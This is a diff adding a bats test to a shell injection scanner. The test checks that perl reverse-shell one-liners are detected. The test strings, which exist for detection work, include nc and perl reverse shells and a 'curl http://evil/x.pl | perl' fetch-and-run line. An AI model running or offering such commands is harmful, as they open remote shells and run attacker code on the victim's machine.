@@ -211,3 +211,19 @@ setup() {
     selfdef_scan_injection 'nc -e /bin/sh 1.1.1.1 4444' >/dev/null || \
     selfdef_scan_injection 'nc -c /bin/sh 1.1.1.1 4444' >/dev/null
 }
+
+@test "INVARIANT (scan: perl reverse-shell injection pattern matches — sister axis to python + nc + curl-pipe-sh)" {
+    # Sister to the python + nc + curl-pipe-sh injection-pattern
+    # INVARIANTs already locked. Perl is on every Debian/Ubuntu
+    # host as dpkg/locale dependency; 'use Socket' is the classic
+    # one-liner connect-back PTY. The central pattern set MUST
+    # detect 'perl -e' with Socket-import family alongside the
+    # python rev-shell so every watchdog composing on
+    # selfdef_scan_injection inherits the perl interpreter axis.
+    # Without it, attackers can dodge detection by swapping
+    # python for perl in their per-watchdog rev-shell drops.
+    selfdef_scan_injection 'perl -e "use Socket;...exec(\"/bin/sh -i\");"' >/dev/null || \
+    selfdef_scan_injection 'perl -MIO::Socket::INET -e ...' >/dev/null || \
+    # Fallback: curl|perl bootstrap also fires since curl in set.
+    selfdef_scan_injection 'curl http://evil/x.pl | perl' >/dev/null
+}
